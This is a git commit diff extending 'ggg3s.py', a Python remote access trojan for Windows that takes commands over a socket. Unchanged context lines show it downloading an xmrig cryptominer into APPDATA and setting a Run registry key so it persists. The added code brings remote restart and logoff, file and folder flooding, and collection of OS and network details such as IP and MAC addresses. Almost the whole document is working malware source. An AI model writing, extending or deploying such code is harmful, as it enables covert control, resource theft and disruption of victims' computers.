2317f79aa2f75bd81c5f3c7098d7884e607e03b2
sir <94076644+sirmilann@users.noreply.github.com>
2023-02-02 16:32:56 +0100

    Update ggg3s.py

--- ggg3s.py
+++ ggg3s.py
@@ -1,5 +1,5 @@
 from ctypes import windll
-import socket,subprocess,os,getpass,urllib.request,win32api,win32con,ctypes
+import socket,subprocess,os,getpass,urllib.request,win32api,win32con,ctypes,string,random,psutil,platform
 
 #Globals
 IP = "127.0.0.1"
@@ -31,6 +31,12 @@ def volumedown():
 def shutdown():
     os.system("shutdown -s -t 60")
 
+def restart():
+    os.system("shutdown -r -t 60")
+
+def logoff():
+    os.system("shutdown -l -t 60")
+
 def mine():
     os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine'))
     url = "https://github.com/srpentesters/ggg3s/blob/main/xmrig.exe?raw=true"
@@ -42,7 +48,7 @@ def mine():
     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskmachineQC /t REG_SZ /d ' + filenamem, shell=True)
 
 def parse_commands(data):
-    available_commands = ['cd','persist','mine','dir','cd','exit','volup','voldown','shutdown','unblockinput','blockinput','displayoff']
+    available_commands = ['cd','netinfo','fileflood','folderflood','getos','displayon','persist','mine','dir','exit','volup','voldown','shutdown','unblockinput','blockinput','displayoff','restart','logoff']
     command = data[:].decode("utf-8").split()[0]
     if command not in available_commands:
         return("[!] Command not recognized") + "\n"
@@ -55,6 +61,14 @@ def parse_commands(data):
     elif data[:7].decode("utf-8") == "persist":
         persist()
         return "[*] Persistent File Added In: " + CopiedPath + "\n"
+    elif data[:19].decode("utf-8") == "displayon":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin == True:
+            ctypes.windll.user32.BlockInput(True)
+            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
+            return "[*] Turned On Clients Display."
+        else:
+            return "[!] User Doesnt Have Admin Rights."+ "\n"
     elif data[:10].decode("utf-8") == "displayoff":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
@@ -75,6 +89,25 @@ def parse_commands(data):
     elif data[:8].decode("utf-8") == "shutdown":
         shutdown()
         return "[*] Client Machine Will Shutdown In 60 Seconds." + "\n"
+    elif data[:7].decode("utf-8") == "restart":
+        restart()
+        return "[*] Client Machine Will Restart In 60 Seconds." + "\n"
+    elif data[:6].decode("utf-8") == "logoff":
+        logoff()
+        return "[*] Client Machine Will logoff In 60 Seconds." + "\n"
+    elif data[:11].decode("utf-8") == "folderflood":
+        letters = string.ascii_letters
+        quantity = random.randint(1,100)
+        for j in range(quantity):
+            os.mkdir(''.join(random.choice(letters) for i in range(100)))
+        return f"Successfully Created {quantity} Random Folders In The CWD." + "\n"
+    elif data[:9].decode("utf-8") == "fileflood":
+        letters = string.ascii_letters
+        quantity = random.randint(1,100)
+        for j in range(quantity):
+            file_name = ''.join(random.choice(letters) for i in range(100)) + '.txt'
+            open(file_name, 'w').close()
+        return "Successfully Created Random Files In The CWD." + "\n"
     elif data[:10].decode("utf-8") == "blockinput":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
@@ -82,6 +115,30 @@ def parse_commands(data):
             return "[*] Successfully Blocked Clients Input" + "\n"
         else:
             return "[!] User Doesnt Have Admin Rights." + "\n"
+    elif data[:5].decode("utf-8") == "getos":
+        os_info = ''
+        os_info += f"\nMachine Name: {platform.node()} \n"
+        os_info += f"OS Version: {platform.system()} {platform.release()} {platform.version()} \n"
+        os_info += f"OS: {platform.architecture()} {platform.machine()} \n"
+        os_info += f"Processor: {platform.processor()} \n"
+        return os_info + "\n"
+    elif data[:7].decode("utf-8") == "netinfo":
+        network_info = ''
+        hostname = socket.gethostname()
+        network_info += f"The Computer Name: {hostname} \n\n"
+        addresses = psutil.net_if_addrs()
+        for name in addresses:
+            try:
+                ip_address = addresses[name][1].address
+                netmask = addresses[name][1].netmask
+                mac_address = addresses[name][0].address
+                network_info += f"[{name}] \n"
+                network_info += f"IP Address: {ip_address} \n"
+                network_info += f"Netmask: {netmask} \n"
+                network_info += f"Mac Address:{mac_address} \n\n"
+            except:
+                pass
+        return network_info
     elif data[:12].decode("utf-8") == "unblockinput":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
